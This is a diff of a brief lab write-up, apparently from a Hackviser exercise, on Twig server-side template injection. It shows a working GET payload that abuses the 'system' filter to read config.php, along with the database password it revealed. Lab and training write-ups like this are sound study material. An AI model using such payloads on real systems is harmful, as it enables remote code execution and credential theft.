@@ -7,14 +7,19 @@ Exploit a Server-Side Template Injection vulnerability in the Twig template engi
 ## 🔍 Vulnerability Analysis
 
 - **Type:** Server-Side Template Injection (SSTI)
+
 - **Endpoint:** Search functionality
+
 - **Parameter:** `q`
+
 - **Detection:** User-controlled input passed directly to Twig template rendering
+
 - **Impact:** Remote code execution leading to database credential exposure
 
 ## 💥 Exploitation
 
 ```http
+
 GET /search?q={{['cat /var/www/html/config.php']|filter('system')}} HTTP/1.1
 Host: true-scream.apac01.hackviser.space
 Result: Executed cat /var/www/html/config.php via system filter, revealing database password: kfqEnLyBrT2JaS
@@ -40,4 +45,5 @@ Filter Bypass: Utilizing built-in filters for malicious purposes
 ## Notes
 
 Conducted in a controlled environment for educational purposes.
+
 ```
